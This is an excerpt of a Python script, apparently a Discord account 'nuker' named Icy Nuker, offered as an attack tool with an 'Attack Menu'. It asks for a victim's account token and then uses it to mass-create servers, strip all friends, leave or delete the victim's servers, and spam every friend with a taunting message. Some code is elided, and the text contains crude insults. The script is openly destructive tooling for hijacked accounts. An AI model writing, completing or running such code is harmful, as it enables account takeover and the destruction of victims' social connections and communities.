...
RPC.connect()
RPC.update(state='Attack Menu', details='Icy Nuker v1.0.0', large_image='Icy')
...
try:
    ...
    print(f"\n                    {Fore.CYAN}╔╗╔  ╦  ╔═╗  ╦ ╦  ╔╦╗\n                    {Fore.LIGHTBLACK_EX}║║║  ║  ║ ╦  ╠═╣   ║ \n                    {Fore.WHITE}╝╚╝  ╩  ╚═╝  ╩ ╩   ╩")
    print('')
    token = input(f"{Fore.WHITE}[{Fore.CYAN}Icy{Fore.WHITE}] Victims Token -{Fore.CYAN}${Fore.WHITE}> ")
    ...
    def name():
        os.system('Title Icy Nuker v1.0.0')
        ...
        def main_hud():
            ...
            def massserver():
                ...
                async def on_connect():
                    for i in range(50):
                        exec.submit(await client.create_guild('Icy On Top Pussy', region=None, icon=None))
                        print(f"{Fore.WHITE}[{Fore.RED}Icy{Fore.WHITE}] Created server  #{i}")
                ...
                async def on_connect():
                    for user in client.user.friends:
                        try:
                            ...
                            print(f"{Fore.WHITE}[{Fore.RED}Icy{Fore.WHITE}] Removed relationship of {Fore.CYAN}${Fore.RESET}> {user.name}")
                        except:
                            print(f"{Fore.WHITE}[{Fore.CYAN}Icy{Fore.WHITE}] Unable to remove {Fore.CYAN}${Fore.RESET}> {user.name}")
                ...
                async def on_connect():
                    for guild in client.guilds:
                        try:
                            ...
                            print(f"{Fore.WHITE}[{Fore.CYAN}Icy{Fore.WHITE}] Left {Fore.CYAN}${Fore.RESET}> {guild.name}")
                        except:
                            exec.submit(await guild.delete())
                            print(f"{Fore.WHITE}[{Fore.CYAN}Icy{Fore.WHITE}] Deleted {Fore.CYAN}${Fore.RESET}> {guild.name}")

            def massdm():
                clear()
                unadd = input('do you want to mass unfriend also? Yes/No ')
                msg = input(f"{Fore.WHITE}[{Fore.CYAN}Icy{Fore.WHITE}] Message {Fore.CYAN}${Fore.RESET}> ")
                ...
                async def on_connect():
                    if unadd == 'Yes':
                        for user in client.user.friends:
                            try:
                                kk = discord.Embed()
                                kk.set_author(name='Icy MASSDM')
                                kk.add_field(name=('Icy Nuked this clown -> ' + client.user.name), value=msg)
                                exec.submit(await user.send(embed=kk))
                                exec.submit(await user.remove_friend())
                                print(f"{Fore.WHITE}[{Fore.CYAN}Icy{Fore.WHITE}] Messaged {Fore.CYAN}${Fore.RESET}> {user.name}")
                            except:
                                print(f"{Fore.WHITE}[{Fore.CYAN}Icy{Fore.WHITE}] Unable to dm {Fore.CYAN}${Fore.RESET}> {user.name}")
            ...
            def credit():
                print('')
                print(f"Credit -> ICY {Fore.CYAN}| {Fore.RESET} Icy")
                time.sleep(10)

            kruh = input(f"{Fore.WHITE}[{Fore.CYAN}Icy{Fore.WHITE}] Choice {Fore.CYAN}${Fore.RESET}>")
            if kruh == '1':
                massserver()
            else:
                if kruh == '2':
